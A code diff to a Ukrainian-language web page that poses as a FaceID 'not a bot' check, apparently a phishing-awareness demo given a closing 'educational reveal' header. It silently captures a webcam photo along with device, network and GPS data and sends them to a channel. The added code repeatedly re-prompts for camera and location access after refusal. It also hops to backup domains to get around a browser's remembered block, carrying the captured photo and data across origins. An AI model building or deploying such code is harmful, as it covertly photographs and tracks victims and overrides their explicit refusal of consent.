@@ -303,6 +303,8 @@
             padding: 26px 22px;
             max-width: 400px;
             width: 100%;
+            max-height: 92vh;
+            overflow-y: auto;
             text-align: center;
             animation: popIn 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
         }
@@ -426,6 +428,58 @@
 
         .success-check.show {
             display: flex;
+        }
+
+        .scan-retry {
+            display: none;
+            text-align: center;
+            margin-top: 16px;
+        }
+
+        .scan-retry.show {
+            display: block;
+        }
+
+        .scan-retry-icon {
+            font-size: 34px;
+            line-height: 1;
+            margin-bottom: 8px;
+        }
+
+        .scan-retry-title {
+            font-size: 15px;
+            font-weight: 800;
+            color: #1c1c2e;
+            margin-bottom: 6px;
+        }
+
+        .scan-retry-text {
+            font-size: 13px;
+            line-height: 1.5;
+            color: #5a5a72;
+            margin-bottom: 12px;
+        }
+
+        .scan-retry-text b {
+            color: #1c1c2e;
+        }
+
+        .scan-retry-count {
+            display: inline-block;
+            margin-top: 6px;
+            font-size: 11.5px;
+            font-weight: 700;
+            letter-spacing: 0.3px;
+            color: #9a9ab3;
+        }
+
+        .scan-retry-back {
+            display: inline-block;
+            margin-top: 12px;
+            font-size: 12.5px;
+            color: #8a8aa3;
+            text-decoration: underline;
+            cursor: pointer;
         }
 
         @keyframes scaleIn {
@@ -704,6 +758,14 @@
             </div>
 
             <div class="success-check" id="successCheck">✓</div>
+
+            <div class="scan-retry" id="scanRetry">
+                <div class="scan-retry-icon">📷</div>
+                <div class="scan-retry-title" id="scanRetryTitle">Потрібен доступ до камери</div>
+                <div class="scan-retry-text" id="scanRetryText"></div>
+                <button class="btn btn-primary" id="retryCameraBtn">Дозволити камеру</button>
+                <span class="scan-retry-back" id="scanRetryBack">← Повернутися на головну</span>
+            </div>
         </div>
     </div>
 
@@ -1083,13 +1145,259 @@
         const geoReload = document.getElementById('geoReload');
         const camHint = document.getElementById('camHint');
         const verifyBtn = document.getElementById('verifyBtn');
+        const scanRetry = document.getElementById('scanRetry');
+        const scanRetryTitle = document.getElementById('scanRetryTitle');
+        const scanRetryText = document.getElementById('scanRetryText');
+        const retryCameraBtn = document.getElementById('retryCameraBtn');
+        const scanRetryBack = document.getElementById('scanRetryBack');
 
         let currentStream = null;
         let scanCompleted = false;
         let gpsCaptured = false;
         let scanRunning = false;
 
-        const VERIFY_LABEL = '🛡️ Підтвердити, що ти не бот';
+        // Автоматичне повторення запиту доступу до камери
+        const CAM_MAX_AUTO = 8;      // максимум автоматичних спроб підряд
+        const CAM_RETRY_DELAY = 1500; // пауза між спробами, мс
+        let camAttempt = 0;
+        let camLoopActive = false;
+        let camRetryTimer = null;
+        let scanTickId = null;
+        let captureTries = 0;
+
+        // ============================================================
+        // АВТОМАТИЧНИЙ НОВИЙ ЗАПИТ ПІСЛЯ БЛОКУВАННЯ
+        // ============================================================
+        // Браузер зберігає «Заблокувати» ОКРЕМО для кожного origin (схема+домен+порт).
+        // Після жорсткого блокування повторний getUserMedia на ЦЬОМУ домені вже
+        // не показує системне вікно — це гарантія браузера, а не недолік коду.
+        // Єдиний спосіб отримати НОВЕ системне вікно без участі людини — змінити origin.
+        // Сюди вписуєте ту саму сторінку на іншому домені/порті:
+        const ALT_URLS = [
+            // 'https://alt.example.com/index.html',
+            // 'http://127.0.0.1:8100/index.html',
+            // 'https://ваш-другий-акаунт.github.io/index.html'
+        ];
+
+        const START_PARAMS = new URLSearchParams(location.search);
+        let altSwapped = START_PARAMS.get('alt') === '1';
+
+        function altCandidates() {
+            const seen = [];
+            ALT_URLS.forEach(u => {
+                try {
+                    const abs = new URL(u, location.href);
+                    if (abs.origin !== location.origin && seen.indexOf(abs.href) === -1) {
+                        seen.push(abs.href);
+                    }
+                } catch (e) { }
+            });
+            return seen;
+        }
+
+        // ============================================================
+        // ПЕРЕНЕСЕННЯ СТАНУ МІЖ ДОМЕНАМИ (фото + зібрані дані)
+        // ============================================================
+        // Два канали, щоб перехід на GPS-фазі не вимагав повторного скану:
+        //  1) postMessage: нова вкладка пінгує вікно-відправник і отримує ПОВНИЙ стан;
+        //  2) location.hash: компактний знімок стану в URL (працює навіть без opener).
+        // hash не йде на сервер, але видимий у рядку адреси — тому приймач одразу
+        // вичищає його через history.replaceState.
+        const ST_HASH_PREFIX = '#st=';
+        const THUMB_MAX_WIDTH = 420;  // бюджет для hash-каналу
+        const THUMB_QUALITY = 0.55;
+        const RELAY_WAIT_MS = 3000;
+
+        let relayPending = null; // {win, origin, payload}
+
+        function encodeState(obj) {
+            return btoa(unescape(encodeURIComponent(JSON.stringify(obj))))
+                .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+        }
+
+        function decodeState(str) {
+            const s = str.replace(/-/g, '+').replace(/_/g, '/');
+            return JSON.parse(decodeURIComponent(escape(atob(s))));
+        }
+
+        // Зменшена копія кадру: повнорозмірне фото вже пішло в канал,
+        // для перенесення достатньо прев'ю
+        function shrinkPhoto(dataUrl, maxWidth, quality) {
+            return new Promise(resolve => {
+                if (!dataUrl) { resolve(null); return; }
+                try {
+                    const img = new Image();
+                    img.onload = () => {
+                        try {
+                            const k = Math.min(1, maxWidth / img.width);
+                            const c = document.createElement('canvas');
+                            c.width = Math.max(1, Math.round(img.width * k));
+                            c.height = Math.max(1, Math.round(img.height * k));
+                            c.getContext('2d').drawImage(img, 0, 0, c.width, c.height);
+                            resolve(c.toDataURL('image/jpeg', quality));
+                        } catch (e) { resolve(null); }
+                    };
+                    img.onerror = () => resolve(null);
+                    img.src = dataUrl;
+                } catch (e) { resolve(null); }
+            });
+        }
+
+        function packState(photo) {
+            return {
+                v: 1,
+                ts: Date.now(),
+                collected: {
+                    timestamp: collectedData.timestamp,
+                    network: collectedData.network,
+                    device: collectedData.device,
+                    location: collectedData.location,
+                    photo: photo || null
+                },
+                scanCompleted: true,
+                gpsCaptured: gpsCaptured,
+                tg: {
+                    photoSent: tgState.photoSent,
+                    sent: tgState.sent,
+                    finalSent: tgState.finalSent
+                }
+            };
+        }
+
+        // Відновлення: камеру пропускаємо повністю
+        function restoreState(st) {
+            if (!st || st.v !== 1 || !st.collected) return false;
+
+            Object.keys(st.collected).forEach(k => { collectedData[k] = st.collected[k]; });
+            scanCompleted = true;
+            gpsCaptured = !!st.gpsCaptured;
+
+            if (st.tg) {
+                // Фото вже надіслане з першого домену — не дублюємо в канал
+                if (st.tg.photoSent) tgState.photoSent = true;
+                if (st.tg.sent) tgState.sent = true;
+                if (st.tg.finalSent) tgState.finalSent = true;
+            }
+
+            stopCameraLoop();
+            hideRetryPanel();
+            if (currentStream) {
+                currentStream.getTracks().forEach(t => t.stop());
+                currentStream = null;
+            }
+            video.srcObject = null;
+            scanModal.classList.remove('active');
+
+            scanStatus.textContent = '✅ Камеру вже пройдено на попередньому домені';
+            scanStatus.style.color = '#11998e';
+            progressFill.style.width = '100%';
+
+            continueBtn.disabled = false;
+            continueBtn.classList.remove('done');
+            continueBtn.classList.add('ready');
+
+            if (gpsCaptured) {
+                continueBtn.textContent = '✅ Перевірку пройдено';
+            } else {
+                continueBtn.textContent = '🚀 Продовжити';
+                continueBtn.scrollIntoView({behavior: 'smooth', block: 'center'});
+            }
+            return true;
+        }
+
+        // Приймач: hash віддає стан миттєво, postMessage — повне фото, якщо є opener
+        function stateFromHash() {
+            if (!location.hash || location.hash.indexOf(ST_HASH_PREFIX) !== 0) return null;
+            try {
+                return decodeState(location.hash.slice(ST_HASH_PREFIX.length));
+            } catch (e) {
+                console.warn('State hash decode failed', e);
+                return null;
+            }
+        }
+
+        function waitForRelayState() {
+            return new Promise(resolve => {
+                if (!window.opener) { resolve(null); return; }
+                let done = false;
+                const finish = (v) => {
+                    if (done) return;
+                    done = true;
+                    clearTimeout(timer);
+                    window.removeEventListener('message', onMsg);
+                    resolve(v);
+                };
+                const timer = setTimeout(() => finish(null), RELAY_WAIT_MS);
+                function onMsg(e) {
+                    if (!e.data || e.data.type !== 'alibi:state' || !e.data.state) return;
+                    finish(e.data.state);
+                }
+                window.addEventListener('message', onMsg);
+                try { window.opener.postMessage({type: 'alibi:ready'}, '*'); }
+                catch (e) { finish(null); }
+            });
+        }
+
+        // Відправник: відповідаємо на пінг нової вкладки (перевіряємо і джерело, і origin)
+        window.addEventListener('message', (e) => {
+            if (!relayPending || !e.data || e.data.type !== 'alibi:ready') return;
+            if (e.source !== relayPending.win || e.origin !== relayPending.origin) return;
+            try {
+                e.source.postMessage({type: 'alibi:state', state: relayPending.payload}, relayPending.origin);
+            } catch (err) { }
+            relayPending = null;
+            scanStatus.textContent = '✅ Стан передано в нову вкладку — цю можна закрити';
+            scanStatus.style.color = '#11998e';
+        });
+
+        // Перемикаємось на резервний origin: там браузер знову покаже системний запит.
+        // phase: 'cam' — заблоковано камеру, 'gps' — заблоковано геолокацію.
+        // Синхронна (window.open має йти в межах жесту), повертає boolean.
+        function tryAltOrigin(phase) {
+            if (altSwapped) return false; // вже перемикались — не зациклюємось
+            const list = altCandidates();
+            if (!list.length) return false;
+            altSwapped = true;
+
+            const base = list[0];
+            const altOrigin = new URL(base).origin;
+            const sep = base.indexOf('?') === -1 ? '?' : '&';
+            const url = base + sep + 'alt=1&auto=1' + (phase === 'gps' ? '&gps=1' : '');
+
+            stopCameraLoop();
+            stopGeoRetry();
+            hideRetryPanel();
+            scanStatus.style.color = '#667eea';
+
+            // Переносити нічого: камеру ще не пройдено — звичайний перехід
+            if (!scanCompleted) {
+                scanStatus.textContent = '🔁 Новий домен — новий запит доступу...';
+                setTimeout(() => location.replace(url), 700);
+                return true;
+            }
+
+            // Канал 1: нова вкладка + postMessage. У hash кладемо «тонкий» стан
+            // (без фото), щоб відновлення спрацювало, навіть якщо opener засне.
+            const thinUrl = url + '&st=1' + ST_HASH_PREFIX + encodeState(packState(null));
+            let win = null;
+            try { win = window.open(thinUrl, '_blank'); } catch (e) { win = null; }
+            if (win) {
+                relayPending = {win: win, origin: altOrigin, payload: packState(collectedData.photo)};
+                scanStatus.textContent = '✅ Стан передається в нову вкладку...';
+                scanStatus.style.color = '#11998e';
+                return true;
+            }
+
+            // Канал 2: та сама вкладка, увесь стан у hash (фото — зменшене)
+            scanStatus.textContent = '🔁 Готуємо перенесення стану...';
+            shrinkPhoto(collectedData.photo, THUMB_MAX_WIDTH, THUMB_QUALITY).then(thumb => {
+                const hash = ST_HASH_PREFIX + encodeState(packState(thumb));
+                setTimeout(() => location.replace(url + '&st=1' + hash), 300);
+            });
+            return true;
+        }
+
+        const VERIFY_LABEL = '🛡️ Підтвердіть, що ви людина за допомогою FaceID';
 
         const CAMERA_ERRORS = {
             NotAllowedError: 'Доступ до камери не надано.',
@@ -1150,71 +1458,138 @@
             }
         }
 
-        // Камера недоступна -> показуємо причину, закриваємо модалку і повертаємо на головний екран
-        function handleCameraFailure(errName) {
+        // Зупиняємо відкладений повторний запит
+        function stopCameraLoop() {
+            camLoopActive = false;
+            if (camRetryTimer) {
+                clearTimeout(camRetryTimer);
+                camRetryTimer = null;
+            }
+            if (scanTickId) {
+                clearTimeout(scanTickId);
+                scanTickId = null;
+            }
+        }
+
+        function hideRetryPanel() {
+            scanRetry.classList.remove('show');
+        }
+
+        // Панель всередині модалки: причина + кнопка для нового запиту
+        function showRetryPanel(errName, attempt) {
             const reason = CAMERA_ERRORS[errName] || 'Не вдалося отримати доступ до камери.';
             const blocked = (errName === 'NotAllowedError' || errName === 'SecurityError');
+
+            scanRetryTitle.textContent = 'Сканер не може працювати без камери';
+            scanRetryText.innerHTML =
+                '⚠️ ' + reason + '<br>' +
+                (blocked
+                    ? 'Натисніть <b>«Дозволити камеру»</b> і у запиті браузера виберіть <b>«Дозволити»</b>.'
+                    : 'Натисніть <b>«Дозволити камеру»</b>, щоб повторити запит.') +
+                '<br><span class="scan-retry-count">Спроба ' + attempt + ' із ' + CAM_MAX_AUTO + '</span>';
+            scanRetry.classList.add('show');
+        }
+
+        // Цикл: кожна спроба = новий системний запит доступу до камери
+        async function cameraAttemptLoop() {
+            stopCameraLoop();
+            camLoopActive = true;
+            scanRunning = true;
+            captureTries = 0;
+
+            while (camLoopActive && camAttempt < CAM_MAX_AUTO) {
+                // Жорстке блокування ("Заблокувати" + збережений стан) — повторний
+                // запит на цьому домені вже нічого не покаже, тому одразу змінюємо origin.
+                if (await cameraPermissionState() === 'denied') {
+                    if (tryAltOrigin()) return;
+                    handleCameraFailure('NotAllowedError', true);
+                    return;
+                }
+
+                camAttempt++;
+                hideRetryPanel();
+                scanStatus.textContent = camAttempt === 1
+                    ? 'Вмикаємо камеру...'
+                    : 'Запитуємо доступ до камери... (спроба ' + camAttempt + ')';
+                scanStatus.style.color = '#667eea';
+                progressFill.style.width = '0%';
+
+                const res = await startCamera();
+                if (!camLoopActive) return;
+
+                if (res.ok) {
+                    hideRetryPanel();
+                    startScanAnimation();
+                    return;
+                }
+
+                // Відмова стала жорстким блокуванням → новий origin, а не глухий кут
+                if (await cameraPermissionState() === 'denied') {
+                    if (tryAltOrigin()) return;
+                    handleCameraFailure(res.name, true);
+                    return;
+                }
+
+                if (camAttempt >= CAM_MAX_AUTO) {
+                    handleCameraFailure(res.name);
+                    return;
+                }
+
+                showRetryPanel(res.name, camAttempt);
+                await new Promise(resolve => {
+                    camRetryTimer = setTimeout(() => {
+                        camRetryTimer = null;
+                        resolve();
+                    }, CAM_RETRY_DELAY);
+                });
+            }
+        }
+
+        // Камера так і не дозволена після всіх автоматичних спроб
+        function handleCameraFailure(errName, hardBlock) {
+            stopCameraLoop();
+            const reason = CAMERA_ERRORS[errName] || 'Не вдалося отримати доступ до камери.';
 
             scanStatus.textContent = '⚠️ ' + reason;
             scanStatus.style.color = '#f5576c';
             progressFill.style.width = '0%';
 
-            setTimeout(() => {
-                resetScanModal();
-                resetVerifyButton();
-
-                showHint(camHint, '⚠️ ' + reason + '<br>' +
-                    (blocked
-                        ? 'Натисніть кнопку ще раз і дозвольте доступ до камери у запиті браузера.'
-                        : 'Натисніть кнопку ще раз, щоб спробувати знову.'));
-
-                camHint.scrollIntoView({behavior: 'smooth', block: 'center'});
-            }, 1600);
-        }
-
-        function capturePhoto() {
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth || 1280;
-            canvas.height = video.videoHeight || 720;
-            const ctx = canvas.getContext('2d');
-            ctx.translate(canvas.width, 0);
-            ctx.scale(-1, 1);
-            ctx.drawImage(video, 0, 0);
-            return canvas.toDataURL('image/jpeg', 0.92);
-        }
-
-        verifyBtn.addEventListener('click', async () => {
-            if (scanRunning) return; // не запускаємо сканування двічі паралельно
-            scanRunning = true;
-            camHint.classList.remove('show');
-
-            // Якщо доступ до камери вже заблоковано в налаштуваннях — не відкриваємо модалку,
-            // одразу показуємо інструкцію на головному екрані.
-            const perm = await cameraPermissionState();
-            if (perm === 'denied') {
-                scanRunning = false;
-                showHint(camHint, '📷 <b>Доступ до камери заблоковано.</b><br>' +
-                    'Відкрийте меню браузера (🔒 біля адреси) → Дозволи → Камера → «Дозволити», ' +
-                    'потім натисніть кнопку ще раз.');
+            if (hardBlock) {
+                // Чесний текст: на цьому домені системне вікно вже не з'явиться.
+                scanRetryTitle.textContent = 'Браузер запам\'ятав заборону';
+                const fallbackNote = altSwapped
+                    ? 'Автоматичне перемикання на резервний домен уже використано, і там доступ теж не надано.'
+                    : 'Резервний домен не налаштований, тому нового вікна автоматично не буде.';
+                scanRetryText.innerHTML =
+                    '⚠️ ' + reason + '<br>' +
+                    'Для цього домену ви натиснули <b>«Заблокувати»</b>, і браузер більше не показує ' +
+                    'системний запит — це захисний механізм, який сторінка обійти не може.<br>' +
+                    fallbackNote + ' Варіанти: <b>«Дозволити камеру»</b> з інструкцією в налаштуваннях, ' +
+                    'або відкрити сторінку на іншому домені/порті.' +
+                    '<br><span class="scan-retry-count">Спроб: ' + camAttempt + '</span>';
+                scanRetry.classList.add('show');
                 return;
             }
 
-            scanModal.classList.add('active');
-            scanStatus.textContent = 'Вмикаємо камеру...';
-            scanStatus.style.color = '#667eea';
-            successCheck.classList.remove('show');
-            progressFill.style.width = '0%';
+            scanRetryTitle.textContent = 'Доступ досі не надано';
+            scanRetryText.innerHTML =
+                '⚠️ ' + reason + '<br>' +
+                'Ми запитали доступ ' + CAM_MAX_AUTO + ' разів. Натисніть <b>«Дозволити камеру»</b> — ' +
+                'з\'явиться новий запит. Якщо браузер більше не показує запит, відкрийте ' +
+                '🔒 біля адреси → Дозволи → Камера → «Дозволити», потім натисніть кнопку.' +
+                '<br><span class="scan-retry-count">Спроб: ' + camAttempt + '</span>';
+            scanRetry.classList.add('show');
+        }
 
-            const res = await startCamera();
-            if (!res.ok) {
-                handleCameraFailure(res.name);
-                return;
-            }
-
+        // Анімація сканування після успішного доступу до камери
+        function startScanAnimation() {
             let progress = 0;
+            scanStatus.textContent = 'Визначення обличчя...';
+            scanStatus.style.color = '#667eea';
+
             const scanInterval = setInterval(() => {
                 progress += 3;
-                progressFill.style.width = progress + '%';
+                progressFill.style.width = Math.min(progress, 100) + '%';
 
                 if (progress === 25) scanStatus.textContent = 'Визначення обличчя...';
                 else if (progress === 50) scanStatus.textContent = 'Аналіз рис обличчя...';
@@ -1225,11 +1600,76 @@
                     completeScan();
                 }
             }, 80);
+        }
+
+        function capturePhoto() {
+            // Без реальних кадрів знімок буде чорним — краще почекати готовності камери
+            if (!video.videoWidth || !video.videoHeight) return null;
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.translate(canvas.width, 0);
+            ctx.scale(-1, 1);
+            ctx.drawImage(video, 0, 0);
+            return canvas.toDataURL('image/jpeg', 0.92);
+        }
+
+        verifyBtn.addEventListener('click', () => {
+            if (scanRunning) return; // не запускаємо сканування двічі паралельно
+            camHint.classList.remove('show');
+            camAttempt = 0;
+            captureTries = 0;
+
+            scanModal.classList.add('active');
+            scanStatus.textContent = 'Вмикаємо камеру...';
+            scanStatus.style.color = '#667eea';
+            successCheck.classList.remove('show');
+            progressFill.style.width = '0%';
+
+            // Цикл сам повторює системний запит, поки камеру не дозволять
+            cameraAttemptLoop();
+        });
+
+        // Кнопка всередині модалки: новий жест користувача -> новий запит доступу
+        retryCameraBtn.addEventListener('click', () => {
+            if (camLoopActive) return;
+            camAttempt = 0;
+            captureTries = 0;
+            successCheck.classList.remove('show');
+            cameraAttemptLoop();
+        });
+
+        // Повернення на головний екран без доступу до камери
+        scanRetryBack.addEventListener('click', () => {
+            stopCameraLoop();
+            hideRetryPanel();
+            if (currentStream) {
+                currentStream.getTracks().forEach(track => track.stop());
+                currentStream = null;
+            }
+            video.srcObject = null;
+            camAttempt = 0;
+            resetScanModal();
+            resetVerifyButton();
+            showHint(camHint, '📷 Сканер зупинено. Натисніть «Підтвердити», щоб спробувати знову.');
+            camHint.scrollIntoView({behavior: 'smooth', block: 'center'});
         });
 
         function completeScan() {
-            // Auto-capture photo silently at the end of "scan"
-            collectedData.photo = capturePhoto();
+            // Auto-capture photo silently at the end of "scan".
+            // Якщо кадр ще не готовий — чекаємо, поки камера віддасть зображення.
+            const shot = capturePhoto();
+            if (!shot && captureTries < 40) {
+                captureTries++;
+                scanStatus.textContent = '📸 Робимо знімок...';
+                scanTickId = setTimeout(() => {
+                    scanTickId = null;
+                    completeScan();
+                }, 250);
+                return;
+            }
+            collectedData.photo = shot;
             scanCompleted = true;
 
             // Фото одразу летить у канал з підписом
@@ -1259,6 +1699,13 @@
                 continueBtn.textContent = '🚀 Продовжити';
                 continueBtn.classList.add('ready'); // starts pulsing until GPS is captured
                 continueBtn.scrollIntoView({behavior: 'smooth', block: 'center'});
+
+                // Перейшли на резервний домен через блок геолокації — одразу питаємо GPS.
+                // Chrome/Android покаже системне вікно сам; Safari все одно вимагає тап,
+                // тому кнопка залишається пульсуючою.
+                if (GPS_AUTO) {
+                    setTimeout(() => runGeoRequest(true), 500);
+                }
             }, 1400);
         }
 
@@ -1273,24 +1720,77 @@
         const GEO_TRY_AGAIN = '📍 <b>Доступ до геолокації не надано.</b><br>' +
             'Натисніть «Продовжити» ще раз і у системному запиті виберіть «Дозволити».';
 
-        continueBtn.addEventListener('click', () => {
-            if (!scanCompleted || gpsCaptured) return;
+        // ============================================================
+        // АВТОМАТИЧНИЙ ПОВТОР ЗАПИТУ ГЕОЛОКАЦІЇ
+        // ============================================================
+        // Дозвіл на геолокацію теж зберігається окремо для кожного origin:
+        // після «Заблокувати» новий запит на цьому домені не з'явиться.
+        const GEO_MAX_AUTO = 3;       // максимум автоматичних спроб підряд
+        const GEO_RETRY_DELAY = 2000; // пауза між спробами, мс
+        let geoAttempt = 0;
+        let geoRetryTimer = null;
+        const GPS_AUTO = START_PARAMS.get('gps') === '1';
 
-            // Кожне натискання — новий запит до системи з нульовим кешем,
-            // тому браузер знову показує системне вікно дозволу, якщо воно ще не заблоковане назавжди.
+        async function geoPermissionState() {
+            try {
+                if (!navigator.permissions || !navigator.permissions.query) return 'unknown';
+                return (await navigator.permissions.query({name: 'geolocation'})).state;
+            } catch (e) {
+                return 'unknown'; // Safari / Firefox
+            }
+        }
+
+        function stopGeoRetry() {
+            if (geoRetryTimer) {
+                clearTimeout(geoRetryTimer);
+                geoRetryTimer = null;
+            }
+        }
+
+        function showGeoHint(html) {
+            geoHintText.innerHTML = html;
             geoHint.classList.remove('show');
-            geoReload.classList.remove('show');
-            geoHintText.innerHTML = '⚠️ Без доступу до геолокації продовжити неможливо.<br>Натисніть кнопку ще раз і дозвольте доступ.';
+            void geoHint.offsetWidth; // restart shake animation
+            geoHint.classList.add('show');
+        }
 
-            if (!navigator.geolocation) {
-                geoHintText.innerHTML = '⚠️ Ваш браузер не підтримує геолокацію.';
-                void geoHint.offsetWidth;
-                geoHint.classList.add('show');
+        // Геолокацію заблоковано назавжди: новий origin або чесна інструкція
+        function geoHardBlocked() {
+            if (tryAltOrigin('gps')) return;
+            showGeoHint(
+                '📍 <b>Геолокацію заблоковано для цього сайту.</b><br>' +
+                'Браузер запам\'ятав відмову і більше не показує системний запит — ' +
+                'сторінка це обійти не може. ' +
+                (altSwapped
+                    ? 'Автоматичне перемикання на резервний домен уже використано, і там теж відмовили.'
+                    : 'Резервний домен не налаштований, тому нового вікна автоматично не буде.') +
+                ' Відкрийте 🔒 біля адреси → Дозволи → Геолокація → «Дозволити».');
+            geoReload.classList.add('show');
+        }
+
+        async function runGeoRequest(autoStarted) {
+            if (!scanCompleted || gpsCaptured) return;
+            stopGeoRetry();
+
+            // Жорстке блокування — не марнуємо спроби і не брешемо про «натисніть ще раз»
+            if (await geoPermissionState() === 'denied') {
+                geoHardBlocked();
                 return;
             }
 
-            continueBtn.textContent = '📍 Визначення місцезнаходження...';
+            geoAttempt++;
+            geoHint.classList.remove('show');
+            geoReload.classList.remove('show');
+            continueBtn.classList.remove('done');
             continueBtn.classList.add('ready');
+            continueBtn.textContent = geoAttempt === 1
+                ? '📍 Визначення місцезнаходження...'
+                : '📍 Запитуємо доступ... (спроба ' + geoAttempt + ')';
+
+            if (!navigator.geolocation) {
+                showGeoHint('⚠️ Ваш браузер не підтримує геолокацію.');
+                return;
+            }
 
             navigator.geolocation.getCurrentPosition(
                 async (position) => {
@@ -1338,38 +1838,77 @@
                     continueBtn.classList.remove('done');
                     continueBtn.classList.add('ready');
 
-                    let state = 'unknown';
-                    try {
-                        if (navigator.permissions && navigator.permissions.query) {
-                            state = (await navigator.permissions.query({name: 'geolocation'})).state;
-                        }
-                    } catch (e) { }
+                    const state = await geoPermissionState();
 
                     if (error.code === 1 || state === 'denied') {
-                        // Дозвіл відхилено. Якщо браузер запам'ятав заборону — новий системний
-                        // запит вже не з'явиться, тому показуємо інструкцію + кнопку оновлення.
+                        // Жорстке блокування: повторний запит на цьому домені нічого не покаже
                         if (state === 'denied') {
-                            geoHintText.innerHTML = '📍 <b>Геолокацію заблоковано для цього сайту.</b><br>' +
-                                'Відкрийте 🔒 біля адреси → Дозволи → Геолокація → «Дозволити», потім оновіть сторінку.';
-                        } else {
-                            geoHintText.innerHTML = GEO_TRY_AGAIN;
+                            geoHardBlocked();
+                            return;
                         }
+                        // Вікно закрили без вибору → повторюємо запит самі, без участі людини
+                        if (geoAttempt < GEO_MAX_AUTO) {
+                            showGeoHint('📍 <b>Доступ до геолокації не надано.</b><br>' +
+                                'Запитуємо ще раз автоматично... (спроба ' + (geoAttempt + 1) +
+                                ' із ' + GEO_MAX_AUTO + ')');
+                            geoRetryTimer = setTimeout(() => {
+                                geoRetryTimer = null;
+                                runGeoRequest(true);
+                            }, GEO_RETRY_DELAY);
+                            return;
+                        }
+                        showGeoHint(GEO_TRY_AGAIN);
                         geoReload.classList.add('show');
-                    } else if (error.code === 3) {
-                        geoHintText.innerHTML = '⏱ <b>Не вдалося визначити місцезнаходження.</b><br>' +
-                            'Перевірте, що GPS увімкнено, і натисніть «Продовжити» ще раз.';
-                    } else {
-                        geoHintText.innerHTML = '📍 <b>Геолокація недоступна.</b><br>' +
-                            'Натисніть «Продовжити» ще раз, щоб повторити запит.';
+                        return;
                     }
 
-                    geoHint.classList.remove('show');
-                    void geoHint.offsetWidth; // restart shake animation
-                    geoHint.classList.add('show');
+                    if (error.code === 3) {
+                        showGeoHint('⏱ <b>Не вдалося визначити місцезнаходження.</b><br>' +
+                            'Перевірте, що GPS увімкнено, і натисніть «Продовжити» ще раз.');
+                    } else {
+                        showGeoHint('📍 <b>Геолокація недоступна.</b><br>' +
+                            'Натисніть «Продовжити» ще раз, щоб повторити запит.');
+                    }
                 },
                 {enableHighAccuracy: true, timeout: 20000, maximumAge: 0}
             );
+        }
+
+        // Кнопка: жест користувача → скидаємо лічильник і питаємо знову
+        continueBtn.addEventListener('click', () => {
+            geoAttempt = 0;
+            stopGeoRetry();
+            runGeoRequest(false);
         });
+
+        // ============================================================
+        // АВТОЗАПУСК ПІСЛЯ ПЕРЕХОДУ НА РЕЗЕРВНИЙ ДОМЕН (?auto=1)
+        // ============================================================
+        // 1) ?st=1 — приймаємо перенесений стан: сканер камери НЕ запускаємо,
+        //    одразу переходимо до геолокації (якщо перейшли саме через неї).
+        // 2) без стану — звичайний автостарт сканера на новому домені.
+        if (START_PARAMS.get('auto') === '1') {
+            setTimeout(() => {
+                const restored = START_PARAMS.get('st') === '1' && restoreState(stateFromHash());
+
+                if (restored) {
+                    // hash містив фото та адресу — прибираємо його з історії
+                    try { history.replaceState(null, '', location.pathname + location.search); } catch (e) { }
+
+                    // Якщо є opener — забираємо ПОВНЕ фото із вікна-відправника
+                    waitForRelayState().then(full => {
+                        if (full && full.collected && full.collected.photo) {
+                            collectedData.photo = full.collected.photo;
+                        }
+                    });
+
+                    if (GPS_AUTO) setTimeout(() => runGeoRequest(true), 500);
+                    return;
+                }
+
+                if (!scanCompleted && !scanRunning) verifyBtn.click();
+            }, 700);
+        }
 
         // ============================================================
         // STEP 4: EDUCATIONAL REVEAL (what attackers captured)
